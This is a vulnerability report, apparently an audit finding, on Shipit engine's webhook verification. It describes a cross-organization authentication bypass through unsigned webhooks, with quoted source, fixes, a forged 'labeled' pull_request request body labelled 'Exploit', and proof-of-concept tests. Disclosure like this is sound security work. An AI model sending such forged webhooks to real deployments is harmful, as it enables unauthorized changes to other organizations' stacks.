### Title
Webhook signature verification is keyed on `organization.login`/`repository.owner.login` while `LabeledHandler` mutates a stack keyed on `repository.full_name`, with no cross-check between the two, and `GitHubApp#verify_webhook_signature` accepts unsigned webhooks whenever the resolved organization has no `webhook_secret` — ([File: app/models/shipit/webhooks/handlers/pull_request/labeled_handler.rb], [File: app/controllers/shipit/webhooks_controller.rb], [File: lib/shipit/github_app.rb])

### Summary
`WebhooksController#verify_signature` selects which `GitHubApp` (and thus which `webhook_secret`) to verify against using `repository_owner`, which falls back to the top-level `organization.login` field when `repository.owner.login` is absent. `GitHubApp#verify_webhook_signature` unconditionally returns `true` when that resolved app has no configured `webhook_secret`. Because the handler that actually mutates state (`LabeledHandler#repository`) resolves the target repository independently from `params.repository.full_name`, an attacker can pick any configured-but-secretless organization name for the top-level `organization.login`/verification path while pointing `repository.full_name` at a victim repository belonging to a different, properly-secured organization.

### Finding Description
Binding claimed to hold: `webhook_secret.present?` (for the org resolved by `repository_owner`) `== false` must never coexist with `verified == true` for a payload whose `repository.full_name` names a different org's repository.

Code path:
- `WebhooksController#repository_owner` [1](#0-0)  resolves the verifying organization from `params.dig('repository','owner','login')` **or** falls back to `params.dig('organization','login')`.
- `WebhooksController#verify_signature` uses that org to fetch a `GitHubApp` and calls `verify_webhook_signature` [2](#0-1) .
- `GitHubApp#verify_webhook_signature` returns `true` unconditionally when `webhook_secret` is blank for that org [3](#0-2) .
- Once verification passes, `WebhooksController#create` parses the raw body itself (not the `repository_owner`-scoped subset) and dispatches to registered handlers [4](#0-3) .
- `LabeledHandler#repository` resolves the target `Shipit::Repository` purely from `params.repository.full_name`, with no reference to `repository_owner` or the org used for verification [5](#0-4) , and `handle` archives/unarchives that repository's review stack [6](#0-5) .

Exploit: send `POST /webhooks` with header `X-Github-Event: pull_request`, no `X-Hub-Signature`, and a JSON body of the form:
```json
{
  "action": "labeled",
  "number": 2,
  "organization": { "login": "no-secret-org" },
  "pull_request": { "state": "open", "labels": [], "head": {"sha":"...", "ref":"..."}, "user": {"login":"attacker"}, "assignees": [], ... },
  "repository": { "full_name": "victim-org/victim-repo" },
  "sender": { "login": "attacker" }
}
```
`repository_owner` resolves to `no-secret-org` (top-level `organization.login`, since `repository.owner.login` is absent). If `no-secret-org` is one of the configured GitHub Apps in `secrets.yml` with `webhook_secret` unset/nil — a configuration explicitly present in this engine's own sample config [7](#0-6)  — `verify_webhook_signature(nil_or_garbage, raw_post)` returns `true` with zero valid signature. The request then reaches `LabeledHandler`, which resolves and mutates `victim-org/victim-repo`'s stack entirely independent of the org used for verification.

Existing guards fail because: (1) `drop_unhandled_event`/`check_if_ping` do not check repository identity; (2) `verify_signature` only proves the request was (optionally) signed by *some* configured org's secret, never that it corresponds to the `repository.full_name` the handler acts on; (3) `ExplicitParameters` schema for `LabeledHandler` only validates types/presence of `repository.full_name`, not organizational consistency with the verifying org.

### Impact Explanation
An attacker who controls (or names) any GitHub organization configured in this Shipit instance's `secrets.yml` without a `webhook_secret` can forge unsigned webhooks that mutate any other organization's stacks handled by `LabeledHandler` (archive/unarchive review stacks), and by the same mechanism any other webhook handler that trusts `repository.full_name`/`organization` fields independent of the verifying org (e.g. push/status/pull_request handlers). This is a cross-tenant authentication bypass and unauthorized write, repeatable for every request, matching the Critical category "a payload for one repository mutating another's stack" and "authentication bypass (forged webhook accepted)".

### Likelihood Explanation
This requires a precondition: at least one GitHub organization configured in `secrets.yml` for this Shipit instance lacks a `webhook_secret`. This is not a hypothetical edge case — the engine's own documented multi-org configuration sample shows exactly this state as valid/expected during setup [8](#0-7) , and nothing in the code enforces that every configured org must have a secret. Given that precondition, exploitation costs the attacker nothing beyond sending one unauthenticated HTTP POST; no GitHub credentials, sessions, or tokens are needed. The vulnerability is fully repeatable against any repository.

### Recommendation
- Require every configured GitHub organization to have a non-blank `webhook_secret`; fail closed (reject, do not treat as verified) when `webhook_secret` is absent, rather than returning `true`.
- Cross-validate that the organization used to select the verifying `GitHubApp` matches the organization derived from `params.repository.full_name` (or `repository.owner.login`) before dispatching to handlers, rejecting mismatches with `422`.

### Proof of Concept
```ruby
# test/lib/shipit/github_app_test.rb (conceptual)
test "verify_webhook_signature returns true with no configured secret" do
  app = Shipit::GitHubApp.new('no-secret-org', {})
  assert app.verify_webhook_signature(nil, '{"anything":"payload"}')
end

# test/controllers/webhooks_controller_test.rb (conceptual)
test "unsigned webhook naming a secretless org mutates another org's stack" do
  victim_stack = shipit_stacks(:review_stack) # belongs to victim-org/victim-repo
  Shipit.stubs(:github).with(organization: 'no-secret-org')
    .returns(Shipit::GitHubApp.new('no-secret-org', {}))

  @request.headers['X-Github-Event'] = 'pull_request'
  body = {
    action: 'labeled', number: victim_stack.pull_requests.first.number,
    organization: { login: 'no-secret-org' },
    pull_request: { state: 'open', labels: [], head: { sha: 'x', ref: 'x' }, user: { login: 'attacker' }, assignees: [] },
    repository: { full_name: victim_stack.github_repo_name },
    sender: { login: 'attacker' }
  }.to_json

  assert_changes -> { victim_stack.reload.archived? }, from: false, to: true do
    post :create, body: body, as: :json
  end
end
```
Both assertions demonstrate: (a) `verify_webhook_signature` returns `true` with no valid signature when the resolved org has no secret, and (b) a payload naming that secretless org for verification purposes but a different org's repository for `repository.full_name` results in a real mutation of the victim's stack — proving `webhook_secret.present? == false` for the verifying org coexists with `verified == true` and a cross-org write.

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L10-15)
```ruby
    def create
      params = JSON.parse(request.raw_post)
      Shipit::Webhooks.for_event(event).each { |handler| handler.call(params) }

      head(:ok)
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L24-30)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified
```

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/labeled_handler.rb (L49-57)
```ruby
          def handle
            if archive?
              stack.archive!
            elsif unarchive?
              stack.unarchive!
            end

            stack
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/labeled_handler.rb (L65-68)
```ruby
          def repository
            @repository ||= Shipit::Repository.from_github_repo_name(params.repository.full_name) ||
                            Shipit::NullRepository.new
          end
```

**File:** config/secrets.development.shopify.yml (L1-23)
```yaml
host: 'shipit-engine.myshopify.io'

# For creating an app see: https://github.com/Shopify/shipit-engine/blob/main/docs/setup.md#creating-the-github-app

github:
  somegithuborg:
    app_id:
    installation_id:
    webhook_secret: # nil
    private_key:
    oauth:
      id:
      secret:
      teams:
  someothergithuborg:
    app_id:
    installation_id:
    webhook_secret: # nil
    private_key:
    oauth:
      id:
      secret:
      teams:
```
